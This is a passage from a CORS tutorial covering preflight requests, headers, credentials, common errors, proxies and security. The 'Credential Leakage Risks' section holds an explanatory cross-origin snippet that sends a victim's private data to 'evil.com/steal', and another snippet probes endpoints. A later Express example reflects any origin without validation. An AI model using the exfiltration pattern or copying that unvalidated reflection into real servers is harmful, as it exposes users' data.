  |    Access-Control-Request-    |
  |    Method: PUT                |
  |    Access-Control-Request-    |
  |    Headers: Content-Type,     |
  |             Authorization     |
  |                               |
  |<--- 204 No Content -----------|
  |    Access-Control-Allow-      |
  |    Origin: https://app.com    |
  |    Access-Control-Allow-      |
  |    Methods: PUT, DELETE       |
  |    Access-Control-Allow-      |
  |    Headers: Content-Type,     |
  |             Authorization     |
  |    Access-Control-Max-Age:    |
  |    86400                      |
  |                               |
  |--- PUT (actual request) ----->|
  |    Authorization: Bearer ...  |
  |                               |
  |<--- 200 OK -------------------|
  |    Access-Control-Allow-      |
  |    Origin: https://app.com    |
```

#### Preflight Request Headers

```javascript
// Browser automatically sends
OPTIONS /api/resource HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, authorization
```

#### Preflight Response Headers

```javascript
// Server must respond with
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: content-type, authorization, x-custom-header
Access-Control-Max-Age: 86400
Access-Control-Allow-Credentials: true
```

### CORS Headers Deep Dive

#### Access-Control-Allow-Origin

Controls which origins can access the resource.

```javascript
// Single origin
Access-Control-Allow-Origin: https://app.example.com

// Wildcard (no credentials allowed with wildcard)
Access-Control-Allow-Origin: *

// Dynamic origin reflection (server-side logic required)
// Request
Origin: https://trusted-site.com

// Response
Access-Control-Allow-Origin: https://trusted-site.com
```

##### Server Implementation Patterns

```javascript
// Node.js/Express - whitelist approach
const allowedOrigins = [
  'https://app.example.com',
  'https://staging.example.com',
  'http://localhost:3000'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  next();
});

// Dynamic subdomain matching
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && origin.match(/^https:\/\/[\w-]+\.example\.com$/)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  next();
});
```

#### Access-Control-Allow-Methods

Specifies allowed HTTP methods for preflight.

```javascript
// Multiple methods
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS

// Specific subset
Access-Control-Allow-Methods: GET, POST

// Case-insensitive but uppercase is convention
Access-Control-Allow-Methods: get, post // Valid but non-standard
```

#### Access-Control-Allow-Headers

Specifies which headers can be used in the actual request.

```javascript
// Common headers
Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With

// Case-insensitive
Access-Control-Allow-Headers: content-type, authorization

// Wildcard (recent browsers only, not with credentials)
Access-Control-Allow-Headers: *

// Must list custom headers explicitly
Access-Control-Allow-Headers: X-Custom-Token, X-API-Key, X-Request-ID
```

##### Header Name Normalization

```javascript
// Browser normalizes header names in requests
fetch('https://api.example.com/data', {
  headers: {
    'x-CUSTOM-header': 'value'  // Sent as: x-custom-header
  }
});

// Server must allow normalized name
Access-Control-Allow-Headers: x-custom-header
```

#### Access-Control-Expose-Headers

Controls which response headers JavaScript can access.

```javascript
// Default exposed headers (always accessible):
// - Cache-Control
// - Content-Language
// - Content-Type
// - Expires
// - Last-Modified
// - Pragma

// Expose additional headers
Access-Control-Expose-Headers: X-Total-Count, X-Page-Number, ETag

// Access in JavaScript
fetch('https://api.example.com/data')
  .then(response => {
    console.log(response.headers.get('X-Total-Count')); // Accessible
    console.log(response.headers.get('X-Custom-Header')); // null if not exposed
  });
```

#### Access-Control-Allow-Credentials

Enables requests with credentials (cookies, authorization headers, TLS certificates).

```javascript
// Server response
Access-Control-Allow-Credentials: true

// Client request
fetch('https://api.example.com/data', {
  credentials: 'include' // Send cookies
});

// Requirements when credentials: true
// 1. Access-Control-Allow-Origin CANNOT be *
// 2. Access-Control-Allow-Headers CANNOT be *
// 3. Access-Control-Allow-Methods CANNOT be *
// 4. Must specify exact origin
```

##### Credentials Modes

```javascript
// omit - never send credentials
fetch(url, { credentials: 'omit' });

// same-origin - send only for same-origin requests (default)
fetch(url, { credentials: 'same-origin' });

// include - always send credentials, even cross-origin
fetch(url, { credentials: 'include' });
```

#### Access-Control-Max-Age

Specifies how long preflight results can be cached.

```javascript
// Cache for 24 hours
Access-Control-Max-Age: 86400

// Cache for 1 hour
Access-Control-Max-Age: 3600

// Don't cache
Access-Control-Max-Age: 0

// Browser limits
// Chrome: max 2 hours (7200 seconds)
// Firefox: max 24 hours (86400 seconds)
// Safari: max 24 hours (86400 seconds)
```

##### Preflight Caching Behavior

```javascript
// First request triggers preflight
fetch('https://api.example.com/data', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' }
});

// Subsequent requests within cache period skip preflight
fetch('https://api.example.com/data', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' }
}); // No preflight if within max-age

// Different URL = different cache entry
fetch('https://api.example.com/other-endpoint', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' }
}); // New preflight required
```

### Request Credentials Handling

#### Cookie Behavior

```javascript
// Same-origin: cookies sent automatically
fetch('https://example.com/api/data'); // Cookies included

// Cross-origin: explicit opt-in required
fetch('https://api.example.com/data', {
  credentials: 'include'
});

// Server must respond with both headers
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://app.example.com // Cannot be *
```

#### Cookie Domain and Path

```javascript
// Cookie set by api.example.com
Set-Cookie: session=abc123; Domain=example.com; Path=/; SameSite=None; Secure

// SameSite=None required for cross-origin with credentials
// Secure flag required when SameSite=None

// Browser will include this cookie when:
fetch('https://api.example.com/data', {
  credentials: 'include' // From https://app.example.com
});
```

#### Authorization Headers

```javascript
// Authorization header triggers preflight
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
  }
});

// Server must allow the header
Access-Control-Allow-Headers: Authorization

// No credentials flag needed for Authorization header
// (unless cookies are also needed)
```

### CORS Error Scenarios

#### Missing Access-Control-Allow-Origin

```javascript
// Request
fetch('https://api.example.com/data');

// Server response lacks CORS header
HTTP/1.1 200 OK
Content-Type: application/json
// Missing: Access-Control-Allow-Origin

// Browser console error
// Access to fetch at 'https://api.example.com/data' from origin 
// 'https://app.example.com' has been blocked by CORS policy: 
// No 'Access-Control-Allow-Origin' header is present on the 
// requested resource.
```

#### Wildcard with Credentials

```javascript
// Invalid configuration
fetch('https://api.example.com/data', {
  credentials: 'include'
});

// Server response
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

// Browser error
// Access to fetch at 'https://api.example.com/data' from origin 
// 'https://app.example.com' has been blocked by CORS policy: 
// The value of the 'Access-Control-Allow-Origin' header in the 
// response must not be the wildcard '*' when the request's 
// credentials mode is 'include'.
```

#### Preflight Failure

```javascript
// Request with custom header
fetch('https://api.example.com/data', {
  method: 'PUT',
  headers: {
    'X-Custom-Header': 'value'
  }
});

// Preflight response missing required header
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: PUT
// Missing: Access-Control-Allow-Headers: X-Custom-Header

// Browser error
// Access to fetch at 'https://api.example.com/data' from origin 
// 'https://app.example.com' has been blocked by CORS policy: 
// Request header field x-custom-header is not allowed by 
// Access-Control-Allow-Headers in preflight response.
```

#### Method Not Allowed

```javascript
// Request
fetch('https://api.example.com/data', {
  method: 'DELETE'
});

// Preflight response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST

// Browser error
// Access to fetch at 'https://api.example.com/data' from origin 
// 'https://app.example.com' has been blocked by CORS policy: 
// Method DELETE is not allowed by Access-Control-Allow-Methods 
// in preflight response.
```

#### Origin Mismatch

```javascript
// Request from https://app.example.com
fetch('https://api.example.com/data');

// Server response
Access-Control-Allow-Origin: https://other-site.com

// Browser error
// Access to fetch at 'https://api.example.com/data' from origin 
// 'https://app.example.com' has been blocked by CORS policy: 
// The 'Access-Control-Allow-Origin' header has a value 
// 'https://other-site.com' that is not equal to the supplied origin.
```

### CORS with Different Request Types

#### XMLHttpRequest

```javascript
const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.example.com/data');
xhr.withCredentials = true; // Include credentials

xhr.onload = function() {
  console.log(xhr.responseText);
};

xhr.onerror = function() {
  console.error('CORS error');
};

xhr.send();
```

#### Fetch API

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  credentials: 'include',
  body: JSON.stringify({ data: 'value' })
})
.then(response => response.json())
.catch(error => {
  // Network error or CORS error
  console.error('Request failed:', error);
});
```

#### Image Loading

```javascript
// Images allow cross-origin by default (no CORS check)
const img = new Image();
img.src = 'https://cdn.example.com/image.jpg'; // Works

// Canvas tainting with cross-origin images
const img = new Image();
img.crossOrigin = 'anonymous'; // Request CORS
img.src = 'https://cdn.example.com/image.jpg';

img.onload = () => {
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.drawImage(img, 0, 0);
  
  // Without CORS, this throws SecurityError
  const dataURL = canvas.toDataURL(); // Requires CORS header from server
};
```

#### Script Loading

```javascript
// Scripts execute cross-origin without CORS
<script src="https://cdn.example.com/library.js"></script>

// CORS for error reporting
<script 
  src="https://cdn.example.com/library.js"
  crossorigin="anonymous"
></script>

// Server must send CORS headers for error details
Access-Control-Allow-Origin: *
```

#### Font Loading

```javascript
// Fonts require CORS headers
@font-face {
  font-family: 'CustomFont';
  src: url('https://cdn.example.com/font.woff2');
}

// Server must respond with
Access-Control-Allow-Origin: *

// Without CORS, browser error:
// Access to font at 'https://cdn.example.com/font.woff2' from 
// origin 'https://app.example.com' has been blocked by CORS policy
```

#### CSS Background Images

```javascript
// CSS images load without CORS (like <img>)
.element {
  background-image: url('https://cdn.example.com/bg.jpg');
}

// But cannot access pixel data via canvas without CORS
```

### CORS vs Same-Origin Policy

#### Same-Origin Policy Restrictions

```javascript
// Blocked by Same-Origin Policy without CORS

// 1. Fetch/XHR to different origin
fetch('https://api.example.com/data'); // Blocked

// 2. Reading cross-origin iframe content
const iframe = document.querySelector('iframe');
iframe.src = 'https://other-site.com';
iframe.contentDocument; // SecurityError

// 3. Accessing cross-origin window properties
const popup = window.open('https://other-site.com');
popup.document; // SecurityError

// 4. Canvas pixel manipulation with cross-origin images
// (without crossOrigin attribute and CORS headers)
```

#### Allowed Cross-Origin Operations

```javascript
// Allowed by Same-Origin Policy (no CORS needed)

// 1. Embedding resources
<img src="https://other-site.com/image.jpg">
<script src="https://other-site.com/script.js"></script>
<link rel="stylesheet" href="https://other-site.com/style.css">
<video src="https://other-site.com/video.mp4"></video>
<iframe src="https://other-site.com/page"></iframe>

// 2. Form submissions
<form action="https://other-site.com/submit" method="POST">
  <input name="data" value="value">
  <button>Submit</button>
</form>

// 3. Opening windows/links
window.open('https://other-site.com');
<a href="https://other-site.com">Link</a>

// 4. Writing to cross-origin window location
popup.location = 'https://other-site.com/page';
```

### Preflight Optimization

#### Minimizing Preflight Requests

```javascript
// Strategy 1: Use simple requests when possible
// Instead of JSON with preflight
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json' // Triggers preflight
  },
  body: JSON.stringify({ key: 'value' })
});

// Use simple Content-Type (no preflight for POST)
const formData = new URLSearchParams();
formData.append('key', 'value');
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: formData
});
```

#### Maximizing Cache Duration

```javascript
// Server configuration for maximum caching
Access-Control-Max-Age: 86400 // 24 hours

// Consider browser limits
// Chrome/Safari: effectively capped at 2 hours for many scenarios
// Firefox: respects up to 24 hours

// Trade-off between preflight reduction and policy flexibility
```

#### Batching Requests

```javascript
// Multiple individual requests = multiple preflights
await fetch('https://api.example.com/users/1', { method: 'PUT' });
await fetch('https://api.example.com/users/2', { method: 'PUT' });
await fetch('https://api.example.com/users/3', { method: 'PUT' });

// Batch into single request = single preflight
await fetch('https://api.example.com/users/batch', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify([
    { id: 1, data: {} },
    { id: 2, data: {} },
    { id: 3, data: {} }
  ])
});
```

### Security Considerations

#### CORS is Not Authentication

```javascript
// CORS does NOT prevent requests, only reading responses
fetch('https://api.example.com/delete-account', {
  method: 'DELETE'
});

// If endpoint lacks authentication, the action executes
// CORS only prevents JavaScript from reading the response

// Always implement server-side authentication
app.delete('/delete-account', authenticateUser, (req, res) => {
  // Verify user identity before performing action
});
```

#### Credential Leakage Risks

```javascript
// Dangerous: reflecting any origin with credentials
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});

// Malicious site can make authenticated requests
// https://evil.com
fetch('https://api.example.com/private-data', {
  credentials: 'include' // Sends user's cookies
}).then(r => r.json()).then(data => {
  // Send stolen data to attacker's server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

#### Origin Validation

```javascript
// Proper origin validation
const allowedOrigins = new Set([
  'https://app.example.com',
  'https://staging.example.com'
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  if (origin && allowedOrigins.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});

// Additional validation for dynamic origins
function isValidOrigin(origin) {
  try {
    const url = new URL(origin);
    // Check protocol
    if (url.protocol !== 'https:') return false;
    // Check domain pattern
    if (!url.hostname.endsWith('.example.com')) return false;
    // Check port if needed
    if (url.port && url.port !== '443') return false;
    return true;
  } catch {
    return false;
  }
}
```

#### Timing Attacks

[Inference] Preflight responses can leak information about endpoint existence:

```javascript
// Endpoint exists: 200 OK with CORS headers
// Endpoint doesn't exist: 404 Not Found

// Attacker can probe API structure
const endpoints = ['users', 'admin', 'config', 'internal'];
for (const endpoint of endpoints) {
  fetch(`https://api.example.com/${endpoint}`, {
    method: 'OPTIONS'
  }).then(response => {
    if (response.ok) {
      console.log(`Found: ${endpoint}`);
    }
  });
}

// Mitigation: consistent responses for all OPTIONS requests
app.options('*', (req, res) => {
  // Always respond with CORS headers, even for non-existent routes
  res.setHeader('Access-Control-Allow-Origin', getAllowedOrigin(req));
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.status(204).send();
});
```

### CORS Proxies

#### Proxy Pattern

```javascript
// Client makes request to same-origin proxy
fetch('/api/proxy?url=https://external-api.com/data')
  .then(response => response.json());

// Server-side proxy forwards request
app.get('/api/proxy', async (req, res) => {
  const targetUrl = req.query.url;
  
  // Validate and sanitize URL
  if (!isAllowedTarget(targetUrl)) {
    return res.status(403).json({ error: 'Forbidden target' });
  }
  
  // Forward request to external API
  const response = await fetch(targetUrl, {
    headers: {
      'User-Agent': 'MyApp/1.0'
    }
  });
  
  const data = await response.json();
  
  // Return data (no CORS issues - same origin)
  res.json(data);
});
```

#### Development Proxy

```javascript
// Webpack dev server proxy configuration
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'https://api.example.com',
        changeOrigin: true,
        pathRewrite: { '^/api': '' }
      }
    }
  }
};

// Vite proxy configuration
export default {
  server: {
    proxy: {
      '/api': {
        target: 'https://api.example.com',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, '')
      }
    }
  }
};
```

#### Public CORS Proxies

[Unverified] Third-party CORS proxies exist but pose security risks:

```javascript
// Public proxy services (security concerns apply)
const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
const targetUrl = 'https://api.example.com/data';

fetch(proxyUrl + targetUrl)
  .then(response => response.json());

// Risks:
// - Proxy can read/modify all data
// - No guarantee of availability
// - May log sensitive information
// - Could inject malicious content

// Only use trusted proxies or self-hosted solutions
```

### Advanced Patterns

#### Conditional CORS Responses

```javascript
// Apply CORS only for specific endpoints
app.get('/public-data', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.json({ data: 'public' });
});

app.get('/private-data', authenticateUser, (req, res) => {
  const origin = req.headers.origin;
  if (isAllowedOrigin(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  res.json({ data: 'private' });
});
```

#### Dynamic Method Permissions

```javascript
// Different methods for different origins
app.options('/api/resource', (req, res) => {
  const origin = req.headers.origin;
  
  let allowedMethods = 'GET, HEAD, OPTIONS';
  
  if (isTrustedOrigin(origin)) {
    allowedMethods = 'GET, POST, PUT, DELETE, OPTIONS';
  } else if (isPartnerOrigin(origin)) {
    allowedMethods = 'GET, POST, OPTIONS';
  }
  
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', allowedMethods);
  res.status(204).send();
});
```

#### Header-Based Access Control

```javascript
// Require specific header values
app.options('/api/resource', (req, res) => {
  const requestedHeaders = req.headers['access-control-request-headers'];
  
  // Only allow if client requests API key header
  if (requestedHeaders?.includes('x-api-key')) {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Headers', 'x-api-key');
  }
  
  res.status(204).send();
});

app.get('/api/resource', (req, res) => {
  const apiKey = req.headers['x-api-key'];
  
  if (!isValidApiKey(apiKey)) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
  
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.json({ data: 'protected' });
});
```

#### Subresource Integrity with CORS

```javascript
// CDN resource with integrity check
<script 
  src="https://cdn.example.com/library@1.0.0/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous"
></script>

// Requires CDN to send CORS headers
Access-Control-Allow-Origin: *

// Browser verifies hash and allows execution
```

### Debugging CORS Issues

#### Browser DevTools Analysis

```javascript
// Check Network tab for preflight request
// Look for OPTIONS request with:
Request Headers:
  Access-Control-Request-Method: PUT
  Access-Control-Request-Headers: content-type
  Origin: https://app.example.com

Response Headers:
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Methods: GET, POST, PUT
  Access-Control-Allow-Headers: content-type
  Access-Control-Max-Age: 3600

// Red text in Console indicates CORS error
// Expand for detailed error message
```

#### Testing CORS Configuration

```javascript
// Manual preflight request
fetch('https://api.example.com/endpoint', {
  method: 'OPTIONS',
  headers: {
    'Origin': 'https://app.example.com',
    'Access-Control-Request-Method': 'PUT',
    'Access-Control-Request-Headers': 'content-type'
  }
}).then(response => {
  console.log('ACAO:', response.headers.get('access-control-allow-origin'));
  console.log('ACAM:', response.headers.get('access-control-allow-methods'));
  console.log('ACAH:', response.headers.get('access-control-allow-headers'));
  console.log('ACMA:', response.headers.get('access-control-max-age'));
});
```

#### Common Configuration Mistakes

```javascript
// Mistake 1: Only handling preflight, not actual request
app.options('/api/data', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.send();
});

app.post('/api/data', (req, res) => {
  // Missing CORS header on actual response!
  res.json({ success: true });
});

// Fix: Add CORS headers to all responses
// Global CORS header (basic)
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  next();
});

// Mistake 2: Not handling OPTIONS (preflight)
app.post('/api/data', (req, res) => {
  // Route does not respond to OPTIONS requests
  res.json({ success: true });
});

// Fix: Handle OPTIONS explicitly (or use CORS middleware)
app.options('/api/data', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.status(204).send();
});

// Mistake 3: Case sensitivity in header names
res.setHeader('access-control-allow-origin', '*'); // Works
res.setHeader('Access-Control-Allow-Origin', '*'); // Works
// Header names are case-insensitive in HTTP
```

---

## Preflight Requests (CORS)

### What Triggers a Preflight Request

A preflight request is automatically sent by the browser before the actual request when certain conditions are met. The browser sends an HTTP OPTIONS request to determine if the actual request is safe to send.

**Conditions that trigger preflight:**

- **HTTP methods other than:** GET, HEAD, or POST
- **Custom headers beyond the CORS-safelisted headers:** Accept, Accept-Language, Content-Language, Content-Type (with restrictions), Range (with byte-range restrictions)
- **Content-Type values other than:** application/x-www-form-urlencoded, multipart/form-data, or text/plain
- **Use of ReadableStream in the request body**
- **XMLHttpRequest upload event listeners registered**

### The OPTIONS Request

When a preflight is triggered, the browser sends an OPTIONS request with specific headers:

```javascript
OPTIONS /api/resource HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, x-custom-header
```

**Key preflight request headers:**

- `Origin`: The origin making the request
- `Access-Control-Request-Method`: The HTTP method the actual request will use
- `Access-Control-Request-Headers`: Comma-separated list of custom headers the actual request will include

### Server Response Requirements

The server must respond to the OPTIONS request with appropriate CORS headers to authorize the actual request:

```javascript
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: POST, PUT, DELETE
Access-Control-Allow-Headers: content-type, x-custom-header
Access-Control-Max-Age: 86400
```

**Critical response headers:**

- `Access-Control-Allow-Origin`: Specifies which origin can access the resource (or `*` for public APIs)
- `Access-Control-Allow-Methods`: Comma-separated list of allowed HTTP methods
- `Access-Control-Allow-Headers`: Comma-separated list of allowed custom headers
- `Access-Control-Max-Age`: How long (in seconds) the preflight response can be cached
- `Access-Control-Allow-Credentials`: Set to `true` if credentials are allowed

### Preflight Caching

Browsers cache preflight responses based on the `Access-Control-Max-Age` header. During the cache period, identical requests to the same endpoint skip the preflight phase.

**Cache considerations:**

- Different browsers implement different maximum cache durations
- Chrome caps at 2 hours (7200 seconds), Firefox at 24 hours (86400 seconds)
- Cache is per-origin, per-URL basis
- Changes to request method or headers may invalidate cache

### Handling Preflight in Fetch API

The fetch API automatically handles preflight requests. You don't manually create OPTIONS requests:

```javascript
// This triggers a preflight due to custom header
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({ data: 'example' })
});
```

The browser automatically sends the OPTIONS request first, then proceeds with the POST if authorized.

### Credentials and Preflight

When using credentials (cookies, authorization headers), additional requirements apply:

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: 'example' })
});
```

**Server requirements for credentialed requests:**

- `Access-Control-Allow-Credentials: true` must be present
- `Access-Control-Allow-Origin` cannot be `*` (must specify exact origin)
- `Access-Control-Allow-Headers` cannot be `*` when credentials are included

### Simple Requests vs Preflighted Requests

**Simple requests (no preflight):**

```javascript
// GET request with standard headers - no preflight
fetch('https://api.example.com/data');

// POST with form data - no preflight
fetch('https://api.example.com/form', {
  method: 'POST',
  body: new FormData(formElement)
});
```

**Preflighted requests:**

```javascript
// DELETE method - triggers preflight
fetch('https://api.example.com/resource', {
  method: 'DELETE'
});

// Custom header - triggers preflight
fetch('https://api.example.com/data', {
  headers: {
    'X-API-Key': 'abc123'
  }
});

// JSON content type - triggers preflight
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ key: 'value' })
});
```

### Preflight Failure Handling

If the preflight fails, the actual request never executes and fetch rejects with a network error:

```javascript
fetch('https://api.example.com/data', {
  method: 'PUT',
  headers: { 'X-Custom': 'value' }
})
.catch(error => {
  // This catches preflight failures
  console.error('Request failed:', error);
  // Error message: "Failed to fetch" or similar
});
```

[Inference]: The exact error message may vary by browser implementation.

**Common preflight failure reasons:**

- Server doesn't respond to OPTIONS request
- Missing required CORS headers in OPTIONS response
- Origin not allowed in `Access-Control-Allow-Origin`
- Method not listed in `Access-Control-Allow-Methods`
- Custom headers not listed in `Access-Control-Allow-Headers`
- Server returns error status (4xx, 5xx) for OPTIONS request

### Wildcard Usage in Preflight Responses

The server can use wildcards in certain headers:

```javascript
// Allow any origin (public API)
Access-Control-Allow-Origin: *

// Allow any headers
Access-Control-Allow-Headers: *

// Allow any methods
Access-Control-Allow-Methods: *
```

**Wildcard restrictions:**

- `Access-Control-Allow-Origin: *` cannot be used with credentialed requests
- `Access-Control-Allow-Headers: *` excludes the `Authorization` header when credentials are used
- Some browsers have different wildcard support levels

### Debugging Preflight Issues

**Browser DevTools inspection:**

1. Open Network tab before making request
2. Look for OPTIONS request to the same URL
3. Check request headers sent in OPTIONS
4. Verify response headers from server
5. Look for red-highlighted requests indicating CORS failures

**Common debugging patterns:**

```javascript
// Add mode to see CORS errors more clearly
fetch('https://api.example.com/data', {
  method: 'POST',
  mode: 'cors', // Explicitly set (this is the default)
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ test: true })
})
.then(response => console.log('Success:', response))
.catch(error => console.error('CORS or network error:', error));
```

### Server-Side Configuration Examples

**Express.js (Node.js):**

```javascript
app.options('/api/*', (req, res) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin);
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, X-Custom-Header');
  res.header('Access-Control-Max-Age', '86400');
  res.sendStatus(204);
});
```

**Using CORS middleware:**

```javascript
const cors = require('cors');

app.use(cors({
  origin: 'https://example.com',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'X-Custom-Header'],
  maxAge: 86400,
  credentials: true
}));
```

### Performance Implications

**Network overhead:**

- Each preflight adds a round-trip to the server
- For high-frequency requests, this doubles latency
- Caching mitigates this after the first request

**Optimization strategies:**

- Maximize `Access-Control-Max-Age` value (up to browser limits)
- Avoid unnecessary custom headers when possible
- Use simple requests where feasible (GET, standard POST)
- Consider grouping API calls to reduce preflight frequency
- Configure CDN or reverse proxy to handle OPTIONS efficiently

### Security Considerations

**Preflight bypass risks:**

[Inference]: Simple requests that don't trigger preflight can still modify server state, so server-side validation remains critical.

- GET requests never trigger preflight, but can still carry sensitive data in URL
- Simple POST requests with form data don't trigger preflight
- Server must validate origin on the actual request, not just preflight

**Best practices:**

- Always validate `Origin` header on actual requests
- Don't rely solely on CORS for security
- Implement proper authentication and authorization
- Use HTTPS to prevent header manipulation
- Limit `Access-Control-Allow-Origin` to known origins when possible
- Don't expose sensitive endpoints to wildcard origins

---

## Simple vs Complex Requests (CORS)

### Simple Requests

Simple requests are HTTP requests that meet all of the following criteria and trigger CORS checks without a preflight OPTIONS request:

#### Method Requirements

The request must use one of these HTTP methods:

- `GET`
- `HEAD`
- `POST`

#### Header Requirements

Only the following headers are allowed (beyond user agent set headers):

- `Accept`
- `Accept-Language`
- `Content-Language`
- `Content-Type` (with restrictions)
- `Range` (with byte range restrictions)

#### Content-Type Restrictions for Simple Requests

When using `POST`, the `Content-Type` header must be one of:

- `application/x-www-form-urlencoded`
- `multipart/form-data`
- `text/plain`

#### No ReadableStream Usage

The request must not use a `ReadableStream` object in the body.

#### No Event Listeners on XMLHttpRequest.upload

For XMLHttpRequest specifically, no event listeners are registered on the upload object.

#### Example of a Simple Request

```javascript
fetch('https://api.example.com/data', {
  method: 'GET',
  headers: {
    'Accept': 'application/json'
  }
});
```

#### Server Response Requirements for Simple Requests

The server must include:

- `Access-Control-Allow-Origin: *` or `Access-Control-Allow-Origin: https://yourdomain.com`
- Optionally `Access-Control-Allow-Credentials: true` if credentials are needed

### Complex Requests (Preflighted Requests)

Complex requests are any requests that don't meet the simple request criteria. These trigger a preflight OPTIONS request before the actual request.

#### Triggers for Preflight

A request becomes complex when it includes:

**Custom Headers** Any header beyond the simple request allowed list:

```javascript
fetch('https://api.example.com/data', {
  headers: {
    'X-Custom-Header': 'value',
    'Authorization': 'Bearer token'
  }
});
```

**Non-Simple Methods**

- `PUT`
- `DELETE`
- `PATCH`
- `CONNECT`
- `OPTIONS`
- `TRACE`

**Non-Simple Content-Types** When using `POST`, `PUT`, or `PATCH` with:

- `application/json`
- `application/xml`
- `text/xml`
- Any other content type not in the simple list

**ReadableStream in Body**

```javascript
const stream = new ReadableStream({...});
fetch(url, {
  method: 'POST',
  body: stream
});
```

### The Preflight Mechanism

#### Preflight Request Details

Before the actual request, the browser automatically sends an OPTIONS request:

```http
OPTIONS /api/resource HTTP/1.1
Host: api.example.com
Origin: https://yourdomain.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header
```

#### Preflight Response Requirements

The server must respond with appropriate CORS headers:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://yourdomain.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: content-type, x-custom-header, authorization
Access-Control-Max-Age: 86400
Access-Control-Allow-Credentials: true
```

#### Header Breakdown

**Access-Control-Allow-Methods** Lists which HTTP methods are permitted:

```
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
```

**Access-Control-Allow-Headers** Lists which custom headers are permitted:

```
Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With
```

**Access-Control-Max-Age** Specifies how long (in seconds) the preflight response can be cached:

```
Access-Control-Max-Age: 86400
```

This reduces the number of preflight requests by caching the permissions.

**Access-Control-Allow-Credentials** Indicates whether credentials (cookies, authorization headers, TLS certificates) are allowed:

```
Access-Control-Allow-Credentials: true
```

When `true`, `Access-Control-Allow-Origin` cannot be `*` and must specify the exact origin.

### Actual Request After Preflight

If the preflight succeeds, the browser sends the actual request:

```javascript
fetch('https://api.example.com/resource', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({ data: 'value' })
});
```

The server must also include CORS headers in the actual response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://yourdomain.com
